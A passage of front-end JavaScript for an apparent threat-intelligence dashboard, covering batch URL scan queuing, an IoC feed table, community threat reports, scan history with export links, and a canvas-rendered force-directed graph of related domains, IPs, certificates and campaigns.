        const resp = await fetch("/api/v1/jobs/batch", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ urls: urls, concurrency: concurrency, async_mode: true })
        });

        if (resp.ok || resp.status === 202) {
            const job = await resp.json();
            _activeBatchJobId = job.job_id;
            btn.textContent = `Running ${job.job_id}...`;
            _updateBatchProgressUI(job);
            _renderBatchRows(job.results || []);
            loadBatchJobsHistory();
            _activeBatchPollTimer = setInterval(() => pollBatchJob(job.job_id), 600);
            pollBatchJob(job.job_id);
        } else {
            const err = await resp.json().catch(() => ({}));
            alert("Batch queue rejected: " + (err.detail || resp.statusText));
            btn.disabled = false;
            btn.textContent = "Queue Async Batch Job";
        }
    } catch (e) {
        alert("Batch scan error: " + e.message);
        btn.disabled = false;
        btn.textContent = "Queue Async Batch Job";
    }
}

// ===================================================================
// 8. Threat Database & IoC Feed
// ===================================================================
async function loadIoCs() {
    const tbody = document.getElementById("ioc-table-body");
    if (!tbody) return;

    try {
        const resp = await fetch("/api/iocs?limit=25");
        if (resp.ok) {
            const iocs = await resp.json();
            tbody.innerHTML = "";

            iocs.forEach(ioc => {
                const tr = document.createElement("tr");
                tr.className = "border-b border-[#1b2538] hover:bg-[#141b29] transition";

                let tagsHtml = "";
                if (Array.isArray(ioc.tags)) {
                    tagsHtml = ioc.tags.slice(0, 3).map(t => 
                        `<span class="px-2 py-0.5 rounded bg-[#101726] border border-[#1e2a3f] text-[10px] text-slate-300 mr-1">${escapeHtml(t)}</span>`
                    ).join("");
                }

                tr.innerHTML = `
                    <td class="py-3 px-4 mono text-slate-200 truncate max-w-sm">${escapeHtml(ioc.indicator)}</td>
                    <td class="py-3 px-4 uppercase text-slate-400 text-[11px]">${escapeHtml(ioc.indicator_type)}</td>
                    <td class="py-3 px-4">${tagsHtml}</td>
                    <td class="py-3 px-4 text-slate-400">${escapeHtml(ioc.source)}</td>
                    <td class="py-3 px-4 text-center">
                        <span class="text-rose-400">+${ioc.votes_malicious}</span> / 
                        <span class="text-emerald-400">-${ioc.votes_benign}</span>
                    </td>
                    <td class="py-3 px-4 text-right">
                        <button onclick="scanDirect('${escapeHtml(ioc.indicator)}')" class="text-blue-400 hover:underline">Scan</button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }
    } catch (e) {
        console.error("Error loading IoCs:", e);
    }
}

async function handleCommunityReportSubmit(e) {
    e.preventDefault();
    const url = document.getElementById("comm-url").value.trim();
    const tagsStr = document.getElementById("comm-tags").value.trim();
    const notes = document.getElementById("comm-notes").value.trim();
    const reporter = document.getElementById("comm-reporter").value.trim() || "Analyst";

    const tags = tagsStr.split(",").map(t => t.trim()).filter(t => t.length > 0);

    try {
        const resp = await fetch("/api/community/report", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                url: url,
                tags: tags,
                notes: notes,
                reported_by: reporter
            })
        });

        if (resp.ok) {
            alert("Threat IoC recorded successfully.");
            document.getElementById("modal-submit").classList.add("hidden");
            document.getElementById("community-report-form").reset();
            loadIoCs();
        } else {
            const err = await resp.json();
            alert("Submission error: " + (err.detail || "Server rejected submission"));
        }
    } catch (e) {
        alert("Submission failed: " + e.message);
    }
}

// ===================================================================
// 9. Historical Scans
// ===================================================================
async function loadRecentScans() {
    const tbody = document.getElementById("history-table-body");
    if (!tbody) return;

    try {
        const resp = await fetch("/api/scans?limit=20");
        if (resp.ok) {
            const scans = await resp.json();
            tbody.innerHTML = "";

            if (scans.length === 0) {
                tbody.innerHTML = `<tr><td colspan="6" class="text-center py-6 text-slate-500">No historical scans recorded yet.</td></tr>`;
                return;
            }

            scans.forEach(s => {
                const tr = document.createElement("tr");
                tr.className = "border-b border-[#1b2538] hover:bg-[#141b29] transition";

                let badgeClass = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/30";
                if (s.verdict === "MALICIOUS") badgeClass = "bg-rose-500/10 text-rose-400 border border-rose-500/30";
                else if (s.verdict === "HIGH_RISK" || s.verdict === "SUSPICIOUS") badgeClass = "bg-amber-500/10 text-amber-400 border border-amber-500/30";

                tr.innerHTML = `
                    <td class="py-3 px-4 mono text-slate-400">${escapeHtml(s.scan_id)}</td>
                    <td class="py-3 px-4 font-semibold text-white truncate max-w-xs">${escapeHtml(s.target_domain)}</td>
                    <td class="py-3 px-4 text-center font-bold text-white">${Math.round(s.overall_score)}</td>
                    <td class="py-3 px-4 text-center">
                        <span class="px-2 py-0.5 rounded text-[11px] font-semibold ${badgeClass}">
                            ${escapeHtml(s.verdict)}
                        </span>
                    </td>
                    <td class="py-3 px-4 text-slate-400">${new Date(s.timestamp).toLocaleString()}</td>
                    <td class="py-3 px-4 text-right space-x-3">
                        <button onclick="inspectScan('${escapeHtml(s.scan_id)}')" class="text-blue-400 hover:underline">Audit Report</button>
                        <button onclick="viewScanInGraph('${escapeHtml(s.scan_id)}')" class="text-cyan-400 hover:underline">Graph</button>
                        <button onclick="runUrlInSandbox('${escapeHtml(s.target_url)}', '${escapeHtml(s.scan_id)}')" class="text-purple-400 hover:underline">Sandbox</button>
                        <button onclick="viewInMitre({ scanId: '${escapeHtml(s.scan_id)}' })" class="text-amber-400 hover:underline">ATT&amp;CK</button>
                        <a href="/api/export/pdf/${encodeURIComponent(s.scan_id)}" target="_blank" rel="noopener noreferrer" class="text-emerald-400 hover:underline">PDF</a>
                        <a href="/api/export/stix/${encodeURIComponent(s.scan_id)}" target="_blank" rel="noopener noreferrer" class="text-slate-400 hover:underline">STIX</a>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        }
    } catch (e) {
        console.error("Error loading scan history:", e);
    }
}

async function inspectScan(scanId) {
    try {
        const resp = await fetch(`/api/scans/${scanId}`);
        if (resp.ok) {
            const data = await resp.json();
            currentReport = data;
            switchTab("tab-scanner");
            displayResults(data);
        }
    } catch (e) {
        alert("Error retrieving scan: " + e.message);
    }
}

function scanDirect(url) {
    switchTab("tab-scanner");
    document.getElementById("url-input").value = url;
    executeScanTarget(url);
}

// ===================================================================
// 10. Threat Relationship Graph Engine (Interactive Canvas Renderer)
// ===================================================================
const GRAPH_TYPE_META = {
    domain: { label: "Domain", short: "DOM", color: "#3b82f6", radius: 16 },
    ip: { label: "IP Address", short: "IP", color: "#10b981", radius: 14 },
    certificate: { label: "Certificate", short: "CRT", color: "#a855f7", radius: 15 },
    url: { label: "URL", short: "URL", color: "#06b6d4", radius: 12 },
    hosting: { label: "Hosting / DNS", short: "INF", color: "#f59e0b", radius: 17 },
    campaign: { label: "Campaign", short: "CMP", color: "#f43f5e", radius: 18 },
};

const GRAPH_RISK_COLORS = {
    malicious: "#f43f5e",
    high_risk: "#f97316",
    suspicious: "#eab308",
    benign: "#10b981",
    neutral: "#475569",
};

const graphState = {
    rawGraph: null,
    focusScanId: null,
    query: "",
    threatsOnly: false,
    visibleTypes: new Set(["domain", "ip", "certificate", "url", "hosting", "campaign"]),
    simNodes: [],
    simNodeMap: new Map(),
    simEdges: [],
    selectedNodeId: null,
    highlightedClusterIds: null,
    activeClusterId: null,
    hoverNodeId: null,
    camX: 0,
    camY: 0,
    zoom: 1,
    animFrame: null,
    ticksRemaining: 0,
    dragNode: null,
    isPanning: false,
    panStartX: 0,
    panStartY: 0,
    camStartX: 0,
    camStartY: 0,
    pointerMoved: false,
    initialized: false,
};

function initThreatGraph() {
    if (graphState.initialized) return;
    graphState.initialized = true;

    const filterForm = document.getElementById("graph-filter-form");
    if (filterForm) {
        filterForm.addEventListener("submit", (e) => {
            e.preventDefault();
            graphState.query = (document.getElementById("graph-search-input")?.value || "").trim();
            graphState.threatsOnly = Boolean(document.getElementById("graph-threats-only")?.checked);
            loadThreatGraph();
        });
    }

    const threatsToggle = document.getElementById("graph-threats-only");
    if (threatsToggle) {
        threatsToggle.addEventListener("change", () => {
            graphState.threatsOnly = threatsToggle.checked;
            loadThreatGraph();
        });
    }

    const resetBtn = document.getElementById("btn-graph-reset");
    if (resetBtn) {
        resetBtn.addEventListener("click", () => {
            graphState.focusScanId = null;
            graphState.query = "";
            graphState.threatsOnly = false;
            graphState.selectedNodeId = null;
            graphState.highlightedClusterIds = null;
            graphState.activeClusterId = null;
            graphState.visibleTypes = new Set(["domain", "ip", "certificate", "url", "hosting", "campaign"]);
            const sInput = document.getElementById("graph-search-input");
            if (sInput) sInput.value = "";
            if (threatsToggle) threatsToggle.checked = false;
            document.querySelectorAll("#graph-type-filters .graph-type-pill").forEach(pill => {
                pill.classList.remove("inactive");
            });
            loadThreatGraph();
        });
    }

    document.querySelectorAll("#graph-type-filters .graph-type-pill").forEach(pill => {
        pill.addEventListener("click", () => {
            const t = pill.getAttribute("data-node-type");
            if (!t) return;
            if (graphState.visibleTypes.has(t)) {
                if (graphState.visibleTypes.size > 1) {
                    graphState.visibleTypes.delete(t);
                    pill.classList.add("inactive");
                }
            } else {
                graphState.visibleTypes.add(t);
                pill.classList.remove("inactive");
            }
            if (graphState.rawGraph) {
                prepareSimulation(graphState.rawGraph);
            }
        });
    });

    const zoomInBtn = document.getElementById("btn-graph-zoom-in");
    const zoomOutBtn = document.getElementById("btn-graph-zoom-out");
    const fitBtn = document.getElementById("btn-graph-fit");
    const relayoutBtn = document.getElementById("btn-graph-relayout");

    if (zoomInBtn) zoomInBtn.addEventListener("click", () => zoomGraphBy(1.25));
    if (zoomOutBtn) zoomOutBtn.addEventListener("click", () => zoomGraphBy(0.8));
    if (fitBtn) fitBtn.addEventListener("click", () => fitGraphToCanvas());
    if (relayoutBtn) {
        relayoutBtn.addEventListener("click", () => {
            if (graphState.rawGraph) {
                prepareSimulation(graphState.rawGraph, true);
            }
        });
    }

    setupGraphCanvasInteractions();
    window.addEventListener("resize", () => {
        const graphPane = document.getElementById("tab-graph");
        if (graphPane && !graphPane.classList.contains("hidden")) {
            renderGraphCanvas();
        }
    });
}

function viewScanInGraph(scanId) {
    if (!scanId) return;
    graphState.focusScanId = scanId;
    graphState.query = "";
    graphState.threatsOnly = false;
    graphState.selectedNodeId = null;
    graphState.highlightedClusterIds = null;
    graphState.activeClusterId = null;
    const sInput = document.getElementById("graph-search-input");
    if (sInput) sInput.value = "";
    const tCheck = document.getElementById("graph-threats-only");
    if (tCheck) tCheck.checked = false;
    switchTab("tab-graph");
}

async function loadThreatGraph() {
    const params = new URLSearchParams();
    if (graphState.focusScanId) params.set("scan_id", graphState.focusScanId);
    if (graphState.query) params.set("q", graphState.query);
    if (graphState.threatsOnly) params.set("threats_only", "true");
    params.set("limit", "150");

    const focusBanner = document.getElementById("graph-focus-banner");
    if (focusBanner) {
        if (graphState.focusScanId) {
            focusBanner.textContent = `Scan Focus: ${graphState.focusScanId}`;
            focusBanner.classList.remove("hidden");
        } else if (graphState.query) {
            focusBanner.textContent = `Filter: "${graphState.query}"`;
            focusBanner.classList.remove("hidden");
        } else {
            focusBanner.classList.add("hidden");
        }
    }

    try {
        const resp = await fetch(`/api/graph?${params.toString()}`);
        if (!resp.ok) return;
        const data = await resp.json();
        graphState.rawGraph = data;
        updateGraphCounters(data);
        renderGraphClusters(data.clusters || []);
        prepareSimulation(data, true);
        renderNodeInspector(null);
    } catch (e) {
        console.error("Failed to load threat graph:", e);
    }
}

function updateGraphCounters(data) {
    const summary = data.summary || {};
    const counts = summary.node_counts || {};
    ["domain", "ip", "certificate", "url", "hosting", "campaign"].forEach(t => {
        const el = document.getElementById(`gcount-${t}`);
        if (el) el.textContent = counts[t] || 0;
    });
    const tn = document.getElementById("graph-total-nodes");
    const te = document.getElementById("graph-total-edges");
    const tc = document.getElementById("graph-total-clusters");
    if (tn) tn.textContent = summary.total_nodes || 0;
    if (te) te.textContent = summary.total_edges || 0;
    if (tc) tc.textContent = summary.shared_clusters_count || 0;
}

function renderGraphClusters(clusters) {
    const container = document.getElementById("graph-clusters-list");
    if (!container) return;
    container.innerHTML = "";

    if (!clusters.length) {
        container.innerHTML = `<p class="text-slate-500 py-2">No multi-domain shared infrastructure clusters in current filter view.</p>`;
        return;
    }

    clusters.forEach(c => {
        const sev = (c.severity || "info").toLowerCase();
        let badgeCls = "bg-blue-500/15 text-blue-300 border-blue-500/30";
        if (sev === "critical") badgeCls = "bg-rose-500/15 text-rose-300 border-rose-500/30";
        else if (sev === "high") badgeCls = "bg-orange-500/15 text-orange-300 border-orange-500/30";
        else if (sev === "medium") badgeCls = "bg-amber-500/15 text-amber-300 border-amber-500/30";

        const card = document.createElement("div");
        card.className = `graph-cluster-card space-y-1.5 ${graphState.activeClusterId === c.cluster_id ? "active" : ""}`;
        card.innerHTML = `
            <div class="flex items-center justify-between gap-2">
                <span class="font-semibold text-slate-100 leading-tight">${escapeHtml(c.title)}</span>
                <span class="px-1.5 py-0.5 rounded text-[10px] font-bold uppercase border flex-shrink-0 ${badgeCls}">${escapeHtml(sev)}</span>
            </div>
            <p class="text-[11px] text-slate-400 leading-snug">${escapeHtml(c.description)}</p>
            <div class="flex flex-wrap gap-1 pt-0.5">
                ${(c.domains || []).slice(0, 4).map(d => `<span class="px-1.5 py-0.5 rounded bg-[#141d2e] text-[10px] text-slate-300 mono">${escapeHtml(d)}</span>`).join("")}
                ${(c.domains || []).length > 4 ? `<span class="text-[10px] text-slate-500">+${c.domains.length - 4} more</span>` : ""}
            </div>
        `;
        card.addEventListener("click", () => {
            if (graphState.activeClusterId === c.cluster_id) {
                graphState.activeClusterId = null;
                graphState.highlightedClusterIds = null;
            } else {
                graphState.activeClusterId = c.cluster_id;
                graphState.highlightedClusterIds = new Set(c.node_ids || []);
                if (c.pivot_node_id && graphState.simNodeMap.has(c.pivot_node_id)) {
                    graphState.selectedNodeId = c.pivot_node_id;
                    const pNode = graphState.simNodeMap.get(c.pivot_node_id);
                    renderNodeInspector(pNode);
                }
                focusCameraOnNodes(c.node_ids || []);
            }
            renderGraphClusters(clusters);
            renderGraphCanvas();
        });
        container.appendChild(card);
    });
}

function prepareSimulation(graphData, resetPositions = false) {
    const allowed = graphState.visibleTypes;
    const oldMap = graphState.simNodeMap;
    const filteredNodes = (graphData.nodes || []).filter(n => allowed.has(n.type));
    const nodeIdSet = new Set(filteredNodes.map(n => n.id));
    const filteredEdges = (graphData.edges || []).filter(e => nodeIdSet.has(e.source) && nodeIdSet.has(e.target));

    const newMap = new Map();
    const total = Math.max(1, filteredNodes.length);
    const typeAngles = { campaign: 0, domain: 1, url: 2, ip: 3, certificate: 4, hosting: 5 };

    filteredNodes.forEach((n, idx) => {
        const prev = !resetPositions ? oldMap.get(n.id) : null;
        let x, y;
        if (prev) {
            x = prev.x;
            y = prev.y;
        } else {
            const baseAngle = ((typeAngles[n.type] ?? 0) / 6) * Math.PI * 2 + (idx / total) * 1.4;
            const radius = 110 + (idx % 7) * 32;
            x = Math.cos(baseAngle) * radius + (Math.random() - 0.5) * 35;
            y = Math.sin(baseAngle) * radius + (Math.random() - 0.5) * 35;
        }
        const simNode = {
            ...n,
            x,
            y,
            vx: 0,
            vy: 0,
        };
        newMap.set(n.id, simNode);
    });

    graphState.simNodes = Array.from(newMap.values());
    graphState.simNodeMap = newMap;
    graphState.simEdges = filteredEdges
        .map(e => ({ ...e, sNode: newMap.get(e.source), tNode: newMap.get(e.target) }))
        .filter(e => e.sNode && e.tNode);

    runForceTicks(140);
    fitGraphToCanvas();
    startSimulationLoop(90);
}

function runForceTicks(iterations = 1) {
    const nodes = graphState.simNodes;
    const edges = graphState.simEdges;
    const nLen = nodes.length;
    if (nLen === 0) return;

    const repulsion = nLen > 80 ? 3200 : 4200;
    const springLen = 105;
    const springK = 0.045;
    const gravity = 0.014;
    const damping = 0.78;

    for (let iter = 0; iter < iterations; iter++) {
        // Repulsion across node pairs
        for (let i = 0; i < nLen; i++) {
            const a = nodes[i];
            for (let j = i + 1; j < nLen; j++) {
                const b = nodes[j];
                let dx = b.x - a.x;
                let dy = b.y - a.y;
                let distSq = dx * dx + dy * dy;
                if (distSq < 25) {
                    dx = (Math.random() - 0.5) * 4;
                    dy = (Math.random() - 0.5) * 4;
                    distSq = dx * dx + dy * dy + 25;
                }
                if (distSq > 260000) continue;
                const force = repulsion / distSq;
                const dist = Math.sqrt(distSq);
                const fx = (dx / dist) * force;
                const fy = (dy / dist) * force;
                a.vx -= fx;
                a.vy -= fy;
                b.vx += fx;
                b.vy += fy;
            }
        }

        // Edge spring attraction
        for (let k = 0; k < edges.length; k++) {
            const e = edges[k];
            const dx = e.tNode.x - e.sNode.x;
            const dy = e.tNode.y - e.sNode.y;
            const dist = Math.sqrt(dx * dx + dy * dy) || 1;
            const targetLen = e.relation === "BELONGS_TO" ? 72 : springLen;
            const diff = (dist - targetLen) * springK;
            const fx = (dx / dist) * diff;
            const fy = (dy / dist) * diff;
            e.sNode.vx += fx;
            e.sNode.vy += fy;
            e.tNode.vx -= fx;
            e.tNode.vy -= fy;
        }

        // Gentle centering + integration
        for (let i = 0; i < nLen; i++) {
            const n = nodes[i];
            if (graphState.dragNode && graphState.dragNode.id === n.id) {
                n.vx = 0;
                n.vy = 0;
                continue;
            }
            n.vx = (n.vx - n.x * gravity) * damping;
            n.vy = (n.vy - n.y * gravity) * damping;
            const maxStep = 24;
            n.x += Math.max(-maxStep, Math.min(maxStep, n.vx));
            n.y += Math.max(-maxStep, Math.min(maxStep, n.vy));
        }
    }
}

function startSimulationLoop(ticks = 60) {
    graphState.ticksRemaining = Math.max(graphState.ticksRemaining, ticks);
    if (graphState.animFrame) return;

    const step = () => {
        if (graphState.ticksRemaining > 0) {
            runForceTicks(2);
            graphState.ticksRemaining -= 2;
            renderGraphCanvas();
            graphState.animFrame = requestAnimationFrame(step);
        } else {
            graphState.animFrame = null;
            renderGraphCanvas();
        }
    };
    graphState.animFrame = requestAnimationFrame(step);
}

function fitGraphToCanvas() {
    const stage = document.getElementById("threat-graph-stage");
    const nodes = graphState.simNodes;
    if (!stage || nodes.length === 0) {
        graphState.camX = 0;
        graphState.camY = 0;
        graphState.zoom = 1;
        renderGraphCanvas();
        return;
    }
    let minX = Infinity, maxX = -Infinity, minY = Infinity, maxY = -Infinity;
    nodes.forEach(n => {
        if (n.x < minX) minX = n.x;
        if (n.x > maxX) maxX = n.x;
        if (n.y < minY) minY = n.y;
        if (n.y > maxY) maxY = n.y;
    });
    const w = Math.max(300, stage.clientWidth);
    const h = Math.max(300, stage.clientHeight);
    const spanX = Math.max(120, maxX - minX + 120);
    const spanY = Math.max(120, maxY - minY + 120);
    graphState.zoom = Math.max(0.28, Math.min(1.45, Math.min(w / spanX, h / spanY) * 0.9));
    graphState.camX = (minX + maxX) / 2;
    graphState.camY = (minY + maxY) / 2;
    renderGraphCanvas();
}

function focusCameraOnNodes(nodeIds) {
    const pts = (nodeIds || []).map(id => graphState.simNodeMap.get(id)).filter(Boolean);
    if (!pts.length) return;
    let minX = Infinity, maxX = -Infinity, minY = Infinity, maxY = -Infinity;
    pts.forEach(n => {
        if (n.x < minX) minX = n.x;
        if (n.x > maxX) maxX = n.x;
        if (n.y < minY) minY = n.y;
        if (n.y > maxY) maxY = n.y;
    });
    const stage = document.getElementById("threat-graph-stage");
    const w = Math.max(300, stage?.clientWidth || 700);
    const h = Math.max(300, stage?.clientHeight || 500);
    const spanX = Math.max(160, maxX - minX + 150);
    const spanY = Math.max(160, maxY - minY + 150);
    graphState.camX = (minX + maxX) / 2;
    graphState.camY = (minY + maxY) / 2;
    graphState.zoom = Math.max(0.45, Math.min(1.5, Math.min(w / spanX, h / spanY) * 0.85));
}

function zoomGraphBy(factor) {
    graphState.zoom = Math.max(0.2, Math.min(3.5, graphState.zoom * factor));
    renderGraphCanvas();
}

function screenToWorld(sx, sy, canvas) {
    const cx = canvas.clientWidth / 2;
    const cy = canvas.clientHeight / 2;
    return {
        x: (sx - cx) / graphState.zoom + graphState.camX,
        y: (sy - cy) / graphState.zoom + graphState.camY,
    };
}

function findNodeAtWorld(wx, wy) {
    const nodes = graphState.simNodes;
    for (let i = nodes.length - 1; i >= 0; i--) {
        const n = nodes[i];
        const r = (GRAPH_TYPE_META[n.type]?.radius || 14) + 6;
        const dx = wx - n.x;
        const dy = wy - n.y;
        if (dx * dx + dy * dy <= r * r) {
            return n;
        }
    }
    return null;
}

function renderGraphCanvas() {
    const canvas = document.getElementById("threat-graph-canvas");
    const stage = document.getElementById("threat-graph-stage");
    if (!canvas || !stage) return;

    const width = stage.clientWidth;
    const height = stage.clientHeight;
    if (width <= 0 || height <= 0) return;

    const dpr = window.devicePixelRatio || 1;
    if (canvas.width !== Math.floor(width * dpr) || canvas.height !== Math.floor(height * dpr)) {
        canvas.width = Math.floor(width * dpr);
        canvas.height = Math.floor(height * dpr);
    }

    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    ctx.save();
    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    ctx.clearRect(0, 0, width, height);

    const nodes = graphState.simNodes;
    const edges = graphState.simEdges;

    if (nodes.length === 0) {
        ctx.fillStyle = "#64748b";
        ctx.font = "600 13px 'Plus Jakarta Sans', sans-serif";
        ctx.textAlign = "center";
        ctx.fillText("No graph nodes match the current filters.", width / 2, height / 2);
        ctx.restore();
        return;
    }

    // Build focused highlight set (selected node neighborhood OR active cluster)
    let focusSet = null;
    if (graphState.selectedNodeId && graphState.simNodeMap.has(graphState.selectedNodeId)) {
        focusSet = new Set([graphState.selectedNodeId]);
        edges.forEach(e => {
            if (e.source === graphState.selectedNodeId) focusSet.add(e.target);
            if (e.target === graphState.selectedNodeId) focusSet.add(e.source);
        });
    } else if (graphState.highlightedClusterIds && graphState.highlightedClusterIds.size > 0) {
        focusSet = graphState.highlightedClusterIds;
    }

    ctx.translate(width / 2, height / 2);
    ctx.scale(graphState.zoom, graphState.zoom);
    ctx.translate(-graphState.camX, -graphState.camY);

    // 1. Draw Edges
    edges.forEach(e => {
        const s = e.sNode;
        const t = e.tNode;
        const inFocus = !focusSet || (focusSet.has(s.id) && focusSet.has(t.id));
        const isCriticalEdge = e.relation === "EXFILTRATES_TO" || e.relation === "ATTRIBUTED_TO";

        ctx.save();
        ctx.globalAlpha = focusSet ? (inFocus ? 0.92 : 0.14) : 0.62;
        ctx.lineWidth = inFocus && focusSet ? 1.9 : 1.25;
        ctx.strokeStyle = isCriticalEdge ? "#f43f5e" : (e.relation === "PRESENTS_CERT" || e.relation === "COVERS_SAN" ? "#a855f7" : "#334155");

        if (e.relation === "REDIRECTS_TO" || e.relation === "COVERS_SAN") {
            ctx.setLineDash([5, 4]);
        }

        ctx.beginPath();
        ctx.moveTo(s.x, s.y);
        ctx.lineTo(t.x, t.y);
        ctx.stroke();

        // Directional arrowhead near target node perimeter
        const dx = t.x - s.x;
        const dy = t.y - s.y;
        const dist = Math.sqrt(dx * dx + dy * dy);
        const tRadius = (GRAPH_TYPE_META[t.type]?.radius || 14) + 4;
        if (dist > tRadius + 10) {
            const ux = dx / dist;
            const uy = dy / dist;
            const ax = t.x - ux * tRadius;
            const ay = t.y - uy * tRadius;
            const arrowLen = 6;
            const angle = Math.atan2(dy, dx);
            ctx.setLineDash([]);
            ctx.fillStyle = ctx.strokeStyle;
            ctx.beginPath();
            ctx.moveTo(ax, ay);
            ctx.lineTo(ax - arrowLen * Math.cos(angle - Math.PI / 6), ay - arrowLen * Math.sin(angle - Math.PI / 6));
            ctx.lineTo(ax - arrowLen * Math.cos(angle + Math.PI / 6), ay - arrowLen * Math.sin(angle + Math.PI / 6));
            ctx.closePath();
            ctx.fill();
        }

        // Edge relationship label when zoomed or focused
        if ((focusSet && inFocus && graphState.zoom >= 0.72) || graphState.zoom >= 1.35) {
            const mx = (s.x + t.x) / 2;
            const my = (s.y + t.y) / 2;
            ctx.font = "500 9px 'Plus Jakarta Sans', sans-serif";
            ctx.textAlign = "center";
            ctx.fillStyle = "#94a3b8";
            ctx.fillText(e.label || e.relation, mx, my - 4);
        }
        ctx.restore();
    });

    // 2. Draw Nodes
    nodes.forEach(n => {
        const meta = GRAPH_TYPE_META[n.type] || { label: n.type, short: "?", color: "#64748b", radius: 14 };
        const riskColor = GRAPH_RISK_COLORS[n.risk_level] || GRAPH_RISK_COLORS.neutral;
        const isSelected = graphState.selectedNodeId === n.id;
        const isHovered = graphState.hoverNodeId === n.id;
        const inFocus = !focusSet || focusSet.has(n.id);
        const r = meta.radius + (n.degree >= 5 ? 2 : 0);

        ctx.save();
        ctx.globalAlpha = inFocus ? 1.0 : 0.2;

        // Threat / selection glow
        if (n.risk_level === "malicious" || n.risk_level === "high_risk" || isSelected || isHovered) {
            ctx.beginPath();
            ctx.arc(n.x, n.y, r + 6, 0, Math.PI * 2);
            ctx.fillStyle = isSelected ? "rgba(56, 189, 248, 0.28)" : (n.risk_level === "malicious" ? "rgba(244, 63, 94, 0.22)" : "rgba(249, 115, 22, 0.18)");
            ctx.fill();
        }

        // Outer risk ring
        ctx.beginPath();
        ctx.arc(n.x, n.y, r + 2, 0, Math.PI * 2);
        ctx.fillStyle = "#080c15";
        ctx.fill();
        ctx.lineWidth = isSelected ? 3 : 2.2;
        ctx.strokeStyle = isSelected ? "#38bdf8" : riskColor;
        ctx.stroke();

        // Inner entity type node body
        ctx.beginPath();
        ctx.arc(n.x, n.y, r - 1.5, 0, Math.PI * 2);
        ctx.fillStyle = meta.color;
        ctx.fill();

        // Type glyph text inside circle
        ctx.fillStyle = "#ffffff";
        ctx.font = "700 8.5px 'JetBrains Mono', monospace";
        ctx.textAlign = "center";
        ctx.textBaseline = "middle";
        ctx.fillText(meta.short, n.x, n.y + 0.5);

        // Node label pill below node
        const showLabel = inFocus && (graphState.zoom >= 0.45 || isSelected || isHovered || n.degree >= 2);
        if (showLabel) {
            const rawLbl = String(n.label || n.id);
            const lbl = rawLbl.length > 28 ? rawLbl.slice(0, 26) + ".." : rawLbl;
            ctx.font = `${isSelected ? "700" : "500"} 10.5px 'Plus Jakarta Sans', sans-serif`;
            const tw = ctx.measureText(lbl).width;
            const lx = n.x - tw / 2 - 5;
            const ly = n.y + r + 5;
            ctx.fillStyle = "rgba(8, 12, 21, 0.86)";
            ctx.fillRect(lx, ly, tw + 10, 15);
            ctx.fillStyle = isSelected ? "#ffffff" : "#cbd5e1";
            ctx.textBaseline = "top";
            ctx.fillText(lbl, n.x, ly + 2.5);
        }

        ctx.restore();
    });

    ctx.restore();
}

function setupGraphCanvasInteractions() {
    const canvas = document.getElementById("threat-graph-canvas");
    const tooltip = document.getElementById("graph-tooltip");
    if (!canvas) return;

    canvas.addEventListener("mousedown", (e) => {
        const rect = canvas.getBoundingClientRect();
        const world = screenToWorld(e.clientX - rect.left, e.clientY - rect.top, canvas);
        const hit = findNodeAtWorld(world.x, world.y);
        graphState.pointerMoved = false;

        if (hit) {
            graphState.dragNode = hit;
            canvas.classList.add("dragging");
        } else {
            graphState.isPanning = true;
            graphState.panStartX = e.clientX;
            graphState.panStartY = e.clientY;
            graphState.camStartX = graphState.camX;
            graphState.camStartY = graphState.camY;
            canvas.classList.add("dragging");
        }
    });

    window.addEventListener("mousemove", (e) => {
        const graphPane = document.getElementById("tab-graph");
        if (!graphPane || graphPane.classList.contains("hidden")) return;

        const rect = canvas.getBoundingClientRect();
        const sx = e.clientX - rect.left;
        const sy = e.clientY - rect.top;

        if (graphState.dragNode) {
            graphState.pointerMoved = true;
            const world = screenToWorld(sx, sy, canvas);
            graphState.dragNode.x = world.x;
            graphState.dragNode.y = world.y;
            startSimulationLoop(20);
            renderGraphCanvas();
            return;
        }

        if (graphState.isPanning) {
            const dx = e.clientX - graphState.panStartX;
            const dy = e.clientY - graphState.panStartY;
            if (Math.abs(dx) > 3 || Math.abs(dy) > 3) graphState.pointerMoved = true;
            graphState.camX = graphState.camStartX - dx / graphState.zoom;
            graphState.camY = graphState.camStartY - dy / graphState.zoom;
            renderGraphCanvas();
            return;
        }

        // Hover detection within canvas bounds
        if (sx >= 0 && sx <= rect.width && sy >= 0 && sy <= rect.height) {
            const world = screenToWorld(sx, sy, canvas);
            const hit = findNodeAtWorld(world.x, world.y);
            const newHover = hit ? hit.id : null;
            if (newHover !== graphState.hoverNodeId) {
                graphState.hoverNodeId = newHover;
                canvas.style.cursor = hit ? "pointer" : "grab";
                renderGraphCanvas();
            }
            if (tooltip) {
                if (hit) {
                    const meta = GRAPH_TYPE_META[hit.type] || { label: hit.type };
                    tooltip.innerHTML = `
                        <div class="font-bold text-white">${escapeHtml(hit.label)}</div>
                        <div class="text-[10px] text-slate-400 mt-0.5">${escapeHtml(meta.label)} · Risk: <span class="uppercase font-semibold">${escapeHtml(hit.risk_level)}</span> · ${hit.degree} links</div>
                    `;
                    tooltip.style.left = `${Math.min(rect.width - 220, sx + 14)}px`;
                    tooltip.style.top = `${Math.max(8, sy - 14)}px`;
                    tooltip.classList.remove("hidden");
                } else {
                    tooltip.classList.add("hidden");
                }
            }
        } else if (tooltip) {
            tooltip.classList.add("hidden");
        }
    });

    window.addEventListener("mouseup", (e) => {
        if (graphState.dragNode || graphState.isPanning) {
            const wasClick = !graphState.pointerMoved;
            const clickedNode = graphState.dragNode;
            graphState.dragNode = null;
            graphState.isPanning = false;
            canvas.classList.remove("dragging");

            if (wasClick) {
                if (clickedNode) {
                    graphState.selectedNodeId = clickedNode.id;
                    graphState.activeClusterId = null;
                    graphState.highlightedClusterIds = null;
                    renderNodeInspector(clickedNode);
                    renderGraphClusters(graphState.rawGraph?.clusters || []);
                } else if (e.target === canvas) {
                    graphState.selectedNodeId = null;
                    renderNodeInspector(null);
                }
                renderGraphCanvas();
            }
        }
    });

    canvas.addEventListener("wheel", (e) => {
        e.preventDefault();
        const factor = e.deltaY < 0 ? 1.12 : 0.89;
        zoomGraphBy(factor);
    }, { passive: false });
}

function renderNodeInspector(node) {
    const container = document.getElementById("graph-node-inspector");
    const typeBadge = document.getElementById("graph-inspector-type");
